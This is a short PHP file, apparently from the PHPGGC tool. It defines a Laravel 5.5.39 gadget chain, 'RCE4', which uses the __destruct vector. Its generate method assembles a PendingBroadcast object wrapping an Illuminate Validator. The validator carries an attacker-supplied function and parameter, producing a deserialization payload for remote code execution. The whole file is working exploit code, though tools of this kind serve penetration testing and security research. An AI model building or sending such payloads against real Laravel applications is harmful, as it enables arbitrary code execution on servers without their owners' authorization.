<?php

namespace GadgetChain\Laravel;

class RCE4 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '5.5.39';
    public $vector = '__destruct';
    public $author = 'BlackFan';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Illuminate\Broadcasting\PendingBroadcast(
            new \Illuminate\Validation\Validator($function),
            $parameter
        );
    }
}
